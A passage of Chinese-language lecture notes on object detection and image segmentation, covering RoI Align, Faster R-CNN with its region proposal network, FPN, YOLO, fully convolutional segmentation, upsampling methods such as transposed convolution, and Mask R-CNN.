<p>第2步：将RoI划分为固定数量的子区域</p>
<ul>
<li>假设我们要得到7×7大小的特征表示</li>
<li>则将RoI在特征图上对应的区域均匀分成7×7=49个小格子</li>
<li>每个小格子在特征图上可能不是整数大小（例如宽1.428，高1.875）</li>
</ul>
<p>第3步：在每个子区域内放置采样点</p>
<ul>
<li>在每个小格子内部放置一组规则间隔的采样点（通常是2×2或3×3个点）</li>
<li>例如：一个小格子内放置4个采样点，它们的位置也是精确的浮点数坐标</li>
</ul>
<p>第4步：对每个采样点进行双线性插值</p>
<ul>
<li>每个采样点的坐标通常落在特征图的"像素网格"之间</li>
<li>找出该采样点周围的4个特征图像素（如上图中的f6,5, f7,5, f6,6, f7,6）</li>
<li>根据采样点到这4个像素的距离计算权重</li>
<li>用这些权重对4个像素的特征值进行加权平均</li>
</ul>
<p>举个具体例子：</p>
<ul>
<li>采样点坐标为(6.5, 5.8)</li>
<li>它周围的4个特征图像素坐标为(6,5), (7,5), (6,6), (7,6)</li>
<li>计算水平和垂直方向的权重：</li>
<li>水平距离：|6.5-6|=0.5和|6.5-7|=0.5</li>
<li>垂直距离：|5.8-5|=0.8和|5.8-6|=0.2</li>
<li>
<p>最终特征值计算：</p>
</li>
<li>
<p>f6.5,5.8 = (f6,5×0.5×0.2) + (f7,5×0.5×0.2) + (f6,6×0.5×0.8) + (f7,6×0.5×0.8)</p>
</li>
</ul>
<p>第5步：聚合采样点特征</p>
<ul>
<li>计算完每个小格子内所有采样点的特征值后</li>
<li>对这些采样点进行聚合（通常是取平均值或最大值）</li>
<li>得到该小格子的最终特征值</li>
</ul>
<p>第6步：生成最终特征表示</p>
<ul>
<li>49个小格子分别得到一个特征值</li>
<li>组合起来形成7×7大小的特征表示</li>
<li>这个固定大小的特征表示会传递给后续网络进行分类、回归等任务</li>
</ul>
<p>RoI Align的核心创新就是在第4步，通过精确计算保留了更多的空间信息，避免了RoI Pool中的量化误差。</p>
</details>
<h3 id="note-cs-cv-lec13_15-faster-r-cnn">Faster R-CNN<a class="headerlink" href="#note-cs-cv-lec13_15-faster-r-cnn" title="Permanent link">&para;</a></h3>
<p>有了Fast R-CNN后，限制时间的主要因素就在于Region Proposal，所以Faster R-CNN的提出就是为了解决这个问题。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec13-15.png" />

<figcaption>Faster R-CNN架构</figcaption>
</figure>
<p>其创新点在于插入了一个RPN(Region Proposal Network)，用于生成Region Proposal。</p>
<ul>
<li>输入图像首先通过CNN骨干网络(如VGG、ResNet)进行处理</li>
<li>
<p>生成特征图(feature map)，包含了图像的高级特征表示</p>
</li>
<li>
<p>特征图被送入区域提议网络(RPN)</p>
</li>
<li>RPN是一个小型的卷积神经网络，直接在特征图上滑动窗口</li>
<li>
<p>对于特征图上的每个位置，RPN预测：</p>
<ul>
<li>是否包含物体(二分类：前景/背景)</li>
<li>多个不同尺寸和比例的边界框(称为"锚点框"，anchors)</li>
<li>每个边界框的调整量(位置微调)</li>
</ul>
</li>
<li>
<p>应用非极大值抑制(NMS)筛选出最佳的区域提议</p>
</li>
<li>
<p>将RPN生成的区域提议映射回特征图上</p>
</li>
<li>
<p>使用RoI Pooling(或改进版RoI Align)将不同大小的区域转换为固定大小的特征表示</p>
</li>
<li>
<p>这些固定大小的RoI特征通过两个并行的全连接层网络：</p>
<ul>
<li>分类网络：预测每个区域的物体类别(Classification loss)</li>
<li>回归网络：进一步精细调整边界框位置(Bounding-box regression loss)</li>
</ul>
</li>
<li>
<p>应用NMS去除重复检测</p>
</li>
<li>生成最终的检测结果：物体类别和精确边界框</li>
</ul>
<p>与Fast R-CNN相比，Faster R-CNN将整个检测流程变成了一个完全可学习的端到端系统，大幅提高了检测速度和准确性。</p>
<h4 id="note-cs-cv-lec13_15-rpn">RPN<a class="headerlink" href="#note-cs-cv-lec13_15-rpn" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec13-16.png" />

<figcaption>RPN的工作流程</figcaption>
</figure>
<p>RPN的工作流程如下：</p>
<ol>
<li>
<p>特征提取</p>
<ul>
<li>输入图像（例如3×640×480大小的猫咪图片）首先通过骨干CNN网络处理</li>
<li>生成与输入图像对齐的特征图（例如512×5×6，其中512是特征通道数）</li>
<li>特征图上的每个点对应原始输入图像上的一个区域</li>
</ul>
</li>
<li>
<p>锚点机制</p>
<ul>
<li>在特征图的每个位置上，生成多个预定义的边界框，称为"锚点"(anchors),在特征图上是一个点，对应到原图上感受野的中心点，然后生成多个不同尺寸和比例的边界框</li>
<li>这些锚点有不同的尺寸和比例，以适应不同大小的物体</li>
<li>图中没有直接显示，但通常每个位置会有k个锚点（比如k=9，3种尺寸×3种比例）</li>
</ul>
</li>
<li>
<p>锚点二分类</p>
<ul>
<li>使用卷积层对特征图进行处理（512个输入通道，2个输出通道）</li>
<li>对每个锚点进行二分类：</li>
<li>正样本（绿色）：可能包含物体的锚点</li>
<li>负样本（红色）：不包含物体的锚点</li>
<li>输出维度为2×5×6×k（k为每个位置的锚点数）</li>
</ul>
</li>
<li>
<p>锚点位置调整</p>
<ul>
<li>虽然图中没有明确显示，但RPN还包括一个边界框回归部分：</li>
<li>对于每个锚点，预测位置调整量（中心点坐标x、y和宽高w、h的调整值）</li>
<li>这部分通常是另一个卷积层，输出维度为4×5×6×k（每个锚点4个回归值）</li>
</ul>
</li>
</ol>
<p>在训练过程中，还需要根据生成的锚点框分类成</p>
<ul>
<li>Positive: 与GT box的IoU&gt;0.7，这样锚点框与GT box的IOU越大，表示越可能包含物体</li>
<li>Negative: 与GT box的IoU&lt;0.3，这样锚点框与GT box的IOU越小，表示越不可能包含物体</li>
<li>中性样本（Neutral）：IoU在0.3到0.7之间的锚点框，通常在训练中被忽略</li>
</ul>
<p>对于正样本锚点框，网络会同时学习分类（前景/背景）和边界框回归（位置调整）。
而对于负样本锚点框，网络只学习分类任务（将其识别为背景），不监督其位置变换，因为这些区域不包含需要精确定位的物体。</p>
<h3 id="note-cs-cv-lec13_15-dealing-with-scale">Dealing with Scale<a class="headerlink" href="#note-cs-cv-lec13_15-dealing-with-scale" title="Permanent link">&para;</a></h3>
<p>我们需处理不同尺度的物体，如何增加detector的尺度不变性呢？</p>
<h4 id="note-cs-cv-lec13_15-image-pyramid">Image Pyramid<a class="headerlink" href="#note-cs-cv-lec13_15-image-pyramid" title="Permanent link">&para;</a></h4>
<p>图像金字塔(Image Pyramid)是处理不同尺度物体检测的经典方法。其基本思想是：</p>
<ul>
<li>将输入图像调整为多个不同尺度（大小）的版本，形成一个"金字塔"</li>
<li>对每个尺度的图像独立运行物体检测器</li>
<li>合并来自不同尺度的检测结果</li>
</ul>
<figure>

<img alt="" src="../NOTE/CS/CV/img/lec13-17.png" />

</figure>
<p>这种方法的主要优点是：</p>
<ul>
<li>简单直观，容易实现</li>
<li>可以检测到不同大小的物体，特别是非常小的物体</li>
<li>与任何物体检测算法兼容</li>
</ul>
<p>然而，图像金字塔也存在明显的缺点：</p>
<ul>
<li>计算成本高昂：需要对每个尺度的图像独立运行完整的检测流程</li>
<li>不同尺度之间没有共享计算，导致大量冗余计算</li>
<li>内存消耗大：需要存储多个尺度的图像和中间特征</li>
<li>推理速度慢：处理时间与金字塔层数成正比</li>
</ul>
<p>这些缺点限制了图像金字塔在需要实时性能的应用中的使用，尤其是在计算资源有限的设备上。</p>
<h4 id="note-cs-cv-lec13_15-multi-scale-features">Multi-Scale Features<a class="headerlink" href="#note-cs-cv-lec13_15-multi-scale-features" title="Permanent link">&para;</a></h4>
<p>多尺度特征(Multi-Scale Features)是解决不同尺度物体检测的另一种方法，利用CNN网络内部不同层级的特征图进行检测。</p>
<p>基本思想是：</p>
<ul>
<li>CNN网络有多个阶段(stages)，每个阶段的特征图分辨率不同</li>
<li>较浅层(early stages)的特征图分辨率高，包含更多空间细节，适合检测小物体</li>
<li>较深层(later stages)的特征图分辨率低，但包含更抽象的语义信息，适合检测大物体</li>
<li>在多个不同分辨率的特征图上分别进行物体检测</li>
</ul>
<figure>

<img alt="" src="../NOTE/CS/CV/img/lec13-18.png" />

</figure>
<p>如图所示，一个典型的多尺度特征检测系统包括：</p>
<ul>
<li>输入图像(例如224×224大小)经过CNN网络的几个阶段处理</li>
<li>从不同阶段提取特征图：</li>
<li>Stage 2：产生56×56大小的特征图</li>
<li>Stage 3：产生28×28大小的特征图</li>
<li>Stage 4：产生14×14大小的特征图</li>
<li>Stage 5：产生7×7大小的特征图</li>
<li>对每个特征图使用独立的物体检测器</li>
</ul>
<p>这种方法的主要优点：</p>
<ul>
<li>计算效率高：只需要处理一次输入图像</li>
<li>特征复用：不同尺度的检测共享早期计算结果</li>
<li>适应性强：可以处理不同尺度的物体</li>
</ul>
<p>但也存在一些问题：</p>
<ul>
<li>检测器问题：在早期特征上的检测器无法利用整个backbone网络，无法访问高层次的语义特征</li>
<li>特征不平衡：不同层级的特征具有不同的语义信息和分辨率，可能导致检测性能不一致</li>
</ul>
<p>为了解决这些问题，研究人员提出了特征金字塔网络(Feature Pyramid Network, FPN)等改进方法，通过自顶向下的路径和横向连接，将高层次语义信息融合到所有尺度的特征图中。</p>
<h4 id="note-cs-cv-lec13_15-feature-pyramid-network">Feature Pyramid Network<a class="headerlink" href="#note-cs-cv-lec13_15-feature-pyramid-network" title="Permanent link">&para;</a></h4>
<p>特征金字塔网络(Feature Pyramid Network, FPN)是解决多尺度物体检测问题的另一种方法，通过自顶向下的路径和横向连接，将高层次语义信息融合到所有尺度的特征图中。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec13-19.png" />

<figcaption>特征金字塔网络架构</figcaption>
</figure>
<p>FPN的设计理念是结合了图像金字塔和多尺度特征的优点，同时克服了它们的缺点。主要组成部分包括：</p>
<ol>
<li>
<p><strong>自底向上路径(Bottom-up Pathway)</strong></p>
<ul>
<li>这就是CNN骨干网络的前向传播</li>
<li>从输入图像开始，通过卷积、池化等操作逐渐减小特征图尺寸</li>
<li>生成不同分辨率的特征图(如上图中C2、C3、C4、C5)</li>
</ul>
</li>
<li>
<p><strong>自顶向下路径(Top-down Pathway)</strong></p>
<ul>
<li>从最高层(最小分辨率)的特征图开始</li>
<li>通过上采样(通常是2倍放大)将特征图的空间尺寸逐步恢复</li>
<li>生成与自底向上路径相同分辨率的特征图(P5、P4、P3、P2)</li>
</ul>
</li>
<li>
<p><strong>横向连接(Lateral Connections)</strong></p>
</li>
<li>将自底向上路径的特征图与上采样的特征图相连接</li>
<li>通过1×1卷积调整通道数，使其匹配</li>
<li>通过元素级加法融合两种特征，结合了高层语义信息和低层空间细节</li>
</ol>
<p>FPN的主要优势：</p>
<ul>
<li><strong>丰富的特征表示</strong>：每个尺度的特征图都包含了高级语义信息和适当的空间细节</li>
<li><strong>计算效率</strong>：只需要处理一次输入图像，比图像金字塔高效得多</li>
<li><strong>检测性能</strong>：各尺度的物体检测性能更一致，小物体的检测精度显著提升</li>
<li><strong>通用性</strong>：可以与多种物体检测框架(如Faster R-CNN、RetinaNet等)结合使用</li>
</ul>
<p>在实际应用中，通常在P2-P5这四个特征图上分别运行RPN和检测器，然后合并结果。相比于单一尺度的特征图，FPN显著提高了物体检测的准确率，特别是对于小物体的检测。</p>
<h3 id="note-cs-cv-lec13_15-single-stage-detectors">Single-Stage Detectors<a class="headerlink" href="#note-cs-cv-lec13_15-single-stage-detectors" title="Permanent link">&para;</a></h3>
<p>上述介绍的R-CNN系列方法都是双阶段检测器，需要先生成候选区域，再进行分类和位置回归。而单阶段检测器则直接在图像上进行检测，跳过了区域提议这一步骤。</p>
<h4 id="note-cs-cv-lec13_15-yolo-you-only-look-once">YOLO (You Only Look Once)<a class="headerlink" href="#note-cs-cv-lec13_15-yolo-you-only-look-once" title="Permanent link">&para;</a></h4>
<p>YOLO是一种快速、准确的单阶段物体检测算法，由Joseph Redmon等人于2016年提出。其核心思想是将物体检测视为一个直接从图像像素到边界框坐标和类别概率的回归问题。</p>
<ol>
<li>
<p><strong>网格划分</strong>：</p>
</li>
<li>
<p>将输入图像划分为S×S个网格</p>
</li>
<li>
<p>在原始YOLO中，通常S=7，即7×7=49个网格</p>
</li>
<li>
<p><strong>预测</strong>：对于每个网格，预测：</p>
</li>
<li>
<p>B个边界框(每个框包含5个值：x, y, w, h, confidence)</p>
</li>
<li>C个类别的条件概率</li>
<li>
<p>每个网格的输出维度为B×5+C</p>
</li>
<li>
<p><strong>置信度评分</strong>：</p>
</li>
<li>
<p>每个边界框有一个置信度分数：Pr(Object)×IoU</p>
</li>
<li>Pr(Object)：表示框中是否包含物体</li>
<li>
<p>IoU：如果包含物体，表示预测框与真实框的重叠程度</p>
</li>
<li>
<p><strong>后处理</strong>：</p>
</li>
<li>
<p>过滤低置信度的预测框</p>
</li>
<li>应用非极大值抑制(NMS)去除重复检测</li>
<li>输出最终的检测结果</li>
</ol>
<p>YOLO的主要优点：</p>
<ul>
<li><strong>速度快</strong>：在强大的GPU上可以达到45-155 FPS的实时性能</li>
<li><strong>全局推理</strong>：在预测时考虑整个图像的上下文，减少了背景错误</li>
<li><strong>可泛化能力强</strong>：学到的表示更具泛化性，在新领域或不常见情景中表现更好</li>
<li><strong>端到端训练</strong>：可以直接优化检测性能</li>
</ul>
<p>缺点：</p>
<ul>
<li><strong>空间约束</strong>：由于每个网格只能预测有限数量的边界框，对于密集物体的检测性能有限</li>
<li><strong>小物体检测性能较弱</strong>：特别是当多个小物体聚集在一个网格内时</li>
<li><strong>分类精度略低于双阶段检测器</strong>：在某些基准测试上</li>
</ul>
<p>YOLO后来有多个改进版本，包括YOLOv2、YOLOv3、YOLOv4等，不断提升了检测精度和速度.</p>
<h2 id="note-cs-cv-lec13_15-image-segmentation">Image Segmentation<a class="headerlink" href="#note-cs-cv-lec13_15-image-segmentation" title="Permanent link">&para;</a></h2>
<p>图像分割(Image Segmentation)是计算机视觉领域的一个重要任务，旨在将图像中的每个像素分类为不同的语义类别，如物体、背景等。</p>
<h3 id="note-cs-cv-lec13_15-semantic-segmentation">Semantic Segmentation<a class="headerlink" href="#note-cs-cv-lec13_15-semantic-segmentation" title="Permanent link">&para;</a></h3>
<p>语义分割(Semantic Segmentation)是图像分割的一种形式，旨在将图像中的每个像素分类为不同的语义类别，如物体、背景等。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec13-20.png" />

<figcaption>语义分割</figcaption>
</figure>
<p>但是这个并不区分每种类别的具体个数；</p>
<h4 id="note-cs-cv-lec13_15-sliding-window_1">Sliding Window<a class="headerlink" href="#note-cs-cv-lec13_15-sliding-window_1" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec13-21.png" />

<figcaption>Sliding Window</figcaption>
</figure>
<p>仍然可以通过滑动窗口的方式，来检测每个像素的类别，但是这样会存在大量的冗余计算</p>
<h4 id="note-cs-cv-lec13_15-convolutional-neural-network">Convolutional Neural Network<a class="headerlink" href="#note-cs-cv-lec13_15-convolutional-neural-network" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec13-22.png" />

<figcaption>Convolutional Neural Network</figcaption>
</figure>
<p>全卷积网络(Fully Convolutional Network, FCN)是一种端到端的语义分割方法，它可以一次性对整张图片进行像素级的分类预测。</p>
<p><strong>网络结构</strong>：</p>
<ol>
<li>
<p><strong>输入层</strong>：</p>
<ul>
<li>输入是一张 3×H×W 的图片（3个颜色通道，高度H，宽度W）</li>
</ul>
</li>
<li>
<p><strong>卷积层</strong>：</p>
<ul>
<li>包含多个连续的卷积层</li>
<li>每层输出特征图大小为 D×H×W（D是特征通道数）</li>
</ul>
</li>
<li>
<p><strong>输出层</strong>：</p>
<ul>
<li>最后通过argmax得到每个像素的类别预测</li>
<li>输出大小为 H×W，每个位置的值表示对应像素的类别</li>
</ul>
</li>
</ol>
<p><strong>工作原理</strong>：</p>
<ul>
<li>网络完全由卷积层组成，没有全连接层</li>
<li>保持空间信息，实现像素级的预测</li>
<li>对整张图片一次性进行预测，而不是逐像素滑动窗口</li>
<li>最终输出与输入图像具有相同的空间尺寸</li>
</ul>
<p><strong>损失函数</strong>：</p>
<ul>
<li>使用逐像素的交叉熵损失（Per-Pixel cross-entropy）</li>
<li>每个像素位置都有一个分类任务</li>
<li>将所有像素位置的损失加总得到总体损失</li>
</ul>
<p>这种方法相比传统的滑动窗口方法更加高效，因为它可以一次性对整张图片进行预测，而不需要重复计算重叠区域。同时，由于网络是全卷积的，它可以自然地保持图像的空间信息，这对于语义分割任务来说是非常重要的。</p>
<p>但是也有缺点：</p>
<p><strong>1. 感受野问题</strong>：</p>
<ul>
<li>有效感受野的大小与卷积层数呈线性关系</li>
<li>使用L个3×3的卷积层，感受野大小为1+2L</li>
<li>需要很多层才能获得较大的感受野，从而捕获更大范围的上下文信息</li>
</ul>
<p><strong>2. 高分辨率图像的计算开销</strong>：</p>
<ul>
<li>对高分辨率图像进行卷积运算的计算成本很高</li>
<li>ResNet等网络通常会积极地进行下采样以减少计算量</li>
<li>但这可能导致空间细节信息的丢失</li>
</ul>
<h4 id="note-cs-cv-lec13_15-downsampling-and-upsampling">Downsampling and Upsampling<a class="headerlink" href="#note-cs-cv-lec13_15-downsampling-and-upsampling" title="Permanent link">&para;</a></h4>
<p>为了解决上述问题，我们可以使用下采样(Downsampling)和上采样(Upsampling)来解决：</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec13-23.png" />

<figcaption>Downsampling and Upsampling</figcaption>
</figure>
<p><strong>网络结构设计</strong>：</p>
<p>下采样阶段：</p>
<ul>
<li>输入：3×H×W的原始图像</li>
<li>通过池化或步长卷积进行下采样</li>
<li>逐步减小特征图的空间尺寸：</li>
<li>High-res: <span class="arithmatex">\(D_1×H/2×W/2\)</span></li>
<li>Med-res: <span class="arithmatex">\(D_2×H/4×W/4\)</span></li>
<li>Low-res: <span class="arithmatex">\(D_3×H/4×W/4\)</span></li>
</ul>
<p>上采样阶段：</p>
<ul>
<li>从低分辨率特征图开始</li>
<li>通过上采样操作逐步恢复空间分辨率</li>
<li>最终输出H×W大小的预测图</li>
</ul>
<p><strong>优势</strong>：</p>
<ul>
<li>下采样减少了特征图的空间维度，显著降低计算量</li>
<li>在较低分辨率下进行主要的特征处理</li>
<li>下采样使得网络能够用较少的层数获得更大的感受野</li>
<li>有助于捕获更大范围的上下文信息</li>
<li>网络同时具有高分辨率的细节信息和低分辨率的语义信息</li>
<li>通过上采样过程将不同尺度的信息进行融合</li>
</ul>
<p>下采样可以通过池化层或步长卷积来实现</p>
<p>上采样主要有两种方法</p>
<h4 id="note-cs-cv-lec13_15-unpooling">Unpooling<a class="headerlink" href="#note-cs-cv-lec13_15-unpooling" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec13-24.png" />

<figcaption>Unpooling</figcaption>
</figure>
<p>Bed of Nails方法，将周围值设置为0即可；</p>
<p>Nearest Neighbor方法，将周围值设置为最近的一个值；</p>
<h4 id="note-cs-cv-lec13_15-bilinear-interpolation">Bilinear Interpolation<a class="headerlink" href="#note-cs-cv-lec13_15-bilinear-interpolation" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec13-25.png" />

<figcaption>Bilinear Interpolation</figcaption>
</figure>
<ul>
<li>对于输出特征图中的每个位置(x,y)</li>
<li>找到输入特征图中最近的四个点</li>
<li>基于相对距离计算权重</li>
<li>使用这些权重对四个点的值进行加权平均</li>
</ul>
<p>相比Bed of Nails和Nearest Neighbor方法，双线性插值能够产生更平滑的上采样结果，这对于语义分割等需要精细空间信息的任务特别重要。</p>
<h4 id="note-cs-cv-lec13_15-bicubic-interpolation">Bicubic Interpolation<a class="headerlink" href="#note-cs-cv-lec13_15-bicubic-interpolation" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec13-26.png" />

<figcaption>Bicubic Interpolation</figcaption>
</figure>
<p>双三次插值是一种更高级的插值方法，它使用x和y方向上最近的三个邻居来构建三次近似。这是图像处理中最常用的调整大小方法。</p>
<ul>
<li>在x和y方向上分别使用三个最近的邻居点</li>
<li>构建三次多项式函数进行插值</li>
<li>考虑更大范围的像素信息来生成新值</li>
</ul>
<p>这种方法虽然计算量较大，但在图像处理和计算机视觉任务中经常被使用，因为它能够提供更高质量的插值结果。</p>
<h4 id="note-cs-cv-lec13_15-max-unpooling">Max Unpooling<a class="headerlink" href="#note-cs-cv-lec13_15-max-unpooling" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec13-27.png" />

<figcaption>Max Unpooling</figcaption>
</figure>
<p>Max Unpooling是一种特殊的上采样方法，它与Max Pooling（最大池化）操作相对应。这种方法的特点是需要在下采样时记住最大值的位置，然后在上采样时将值放回原来的位置。</p>
<p><strong>Max Pooling阶段</strong>：</p>
<ul>
<li>对输入特征图进行最大池化操作</li>
<li>记录每个池化窗口中最大值的位置（switch variables）</li>
<li>如图所示，4×4的输入经过池化后变为2×2</li>
<li>同时保存了最大值的具体位置信息</li>
</ul>
<p><strong>Max Unpooling阶段</strong>：</p>
<ul>
<li>使用保存的位置信息（switch variables）</li>
<li>将池化后的值放回原来的位置</li>
<li>其他位置填充为0</li>
<li>如图所示，2×2的特征图被还原为4×4</li>
</ul>
<p>输入特征图中值5被选为最大值，位置信息被记录，在反池化时，值5被放回原来的确切位置，未被选为最大值的位置填充为0，这样保证了重要特征的精确位置信息不会丢失</p>
<p>这样的方法，保留了精确的空间位置信息，特征的定位更加准确，适合需要精确重建的任务，与最大池化层自然配对</p>
<h4 id="note-cs-cv-lec13_15-transposed-convolution">Transposed Convolution<a class="headerlink" href="#note-cs-cv-lec13_15-transposed-convolution" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec13-28.png" />

<figcaption>Transposed Convolution</figcaption>
</figure>
<p>转置卷积(Transposed Convolution)，也称为反卷积(Deconvolution)，是一种用于上采样的卷积操作。</p>
<p>其基本过程如下：</p>
<p>例如，输入是2×2的特征图，卷积核是3×3，步幅为2，填充为0，输出是4×4的特征图。</p>
<p>将输入特征图对应位置的值与卷积核相乘，得到一个3×3的特征图，然后将其中心点作为输出图的第一个位置，然后依次进行，每次前进的步幅为2，对于重叠的部分，取相加；</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p><figure markdown="span">
<img alt="" src="../NOTE/CS/CV/img/lec13-29.png" />
<figcaption>Example</figcaption>
</figure></p>
<p>首先，将a与卷积核相乘，得到第一部分，将b与卷积核相乘，得到第二部分，两部分放到对应的位置上，然后重叠的部分进行相加；</p>
</div>
<div class="admonition info">
<p class="admonition-title">Transposed Convolution</p>
<p>为什么叫做转置卷积呢？</p>
<p>我们可以将卷积操作表示为矩阵乘法：</p>
<ol>
<li>
<p><strong>普通卷积</strong>：</p>
</li>
<li>
<p>可以表示为 <span class="arithmatex">\(\vec{x} * \vec{a} = X\vec{a}\)</span></p>
</li>
<li>a是输入，X是卷积核</li>
<li>
<p>例如，当步长为1时：</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-cv-lec13_15-__codelineno-0-1"></a>[x y z 0 0 0][a]   [ay + bz    ]
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-cs-cv-lec13_15-__codelineno-0-2"></a>[0 x y z 0 0][b] = [ax + by + cz]
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-cs-cv-lec13_15-__codelineno-0-3"></a>[0 0 x y z 0][c]   [bx + cy + dz]
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-cs-cv-lec13_15-__codelineno-0-4"></a>[0 0 0 x y z][d]   [cx + dy    ]
</span></code></pre></div>
</li>
<li>
<p><strong>转置卷积</strong>：</p>
</li>
<li>
<p>表示为 <span class="arithmatex">\(\vec{x} *^T \vec{a} = X^T\vec{a}\)</span></p>
</li>
<li>使用了原卷积矩阵的转置</li>
<li>当步长为1时，就是普通卷积（但padding规则不同）
   例如上面的转置卷积为
   <div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-cs-cv-lec13_15-__codelineno-1-1"></a>[x 0 0 0]
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-cs-cv-lec13_15-__codelineno-1-2"></a>[y x 0 0][a]
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-cs-cv-lec13_15-__codelineno-1-3"></a>[z y x 0][b]
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-cs-cv-lec13_15-__codelineno-1-4"></a>[0 z y x][c]
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#note-cs-cv-lec13_15-__codelineno-1-5"></a>[0 0 z y][d]
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#note-cs-cv-lec13_15-__codelineno-1-6"></a>[0 0 0 z]
</span></code></pre></div>
当步长大于1时，就不能使用普通的卷积来表示它了</li>
</ol>
<p><figure markdown="span">
<img alt="" src="../NOTE/CS/CV/img/lec13-30.png" width="500" />
<figcaption>Example</figcaption>
</figure></p>
</div>
<h4 id="note-cs-cv-lec13_15-things-and-stuff">Things and stuff<a class="headerlink" href="#note-cs-cv-lec13_15-things-and-stuff" title="Permanent link">&para;</a></h4>
<ul>
<li>Things: 物体，有明确的边界，例如人、车、动物等</li>
<li>Stuff: 背景，没有明确的边界，例如天空、草地、墙壁等</li>
</ul>
<p>在object detection中，我们通常需要区分things和stuff，但是只会把box给到things而不是stuff；</p>
<p>在semantic segmentation中，我们通常需要区分things和stuff，同时关注这两个部分；</p>
<h3 id="note-cs-cv-lec13_15-instance-segmentation">Instance Segmentation<a class="headerlink" href="#note-cs-cv-lec13_15-instance-segmentation" title="Permanent link">&para;</a></h3>
<p>实例分割(Instance Segmentation)是图像分割的一种形式，旨在将图像中的每个像素分类为不同的语义类别，如物体、背景等。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec13-31.png" />

<figcaption>Instance Segmentation</figcaption>
</figure>
<h4 id="note-cs-cv-lec13_15-mask-r-cnn">Mask R-CNN<a class="headerlink" href="#note-cs-cv-lec13_15-mask-r-cnn" title="Permanent link">&para;</a></h4>
<p>Mask R-CNN是在Faster R-CNN的基础上扩展出来的实例分割模型，它不仅可以检测出物体的位置和类别，还能生成每个物体的像素级掩码（mask）。</p>
<p>即在最后会输出：</p>
<ul>
<li><strong>分类分支</strong>：预测物体类别（Classification Scores: C）</li>
<li><strong>边界框分支</strong>：预测边界框坐标（Box coordinates per class: 4×C）</li>
<li><strong>掩码分支</strong>：为每个类别预测二值掩码（Mask Prediction: C×28×28）</li>
</ul>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec13-32.png" />

<figcaption>Mask R-CNN架构示意图</figcaption>
</figure>
<p>其工作流程如下</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec13-33.png" />

<figcaption>Mask R-CNN工作流程</figcaption>
</figure>
<p>即再输出了box和class之后，还会输出mask，共有C个通道，每个通道对应一个物体的mask，每个mask的大小为H×W，即与原图的大小相同；即在某个像素中，如果属于物体A的通道的值比较高，那么这个像素被归于物体A；</p></section><section class="print-page" id="note-cs-cv-lec16" heading-number="2.4.5.12"><h1 id="note-cs-cv-lec16-recurrent-neural-networks">Recurrent Neural Networks<a class="headerlink" href="#note-cs-cv-lec16-recurrent-neural-networks" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 2068 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 3 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 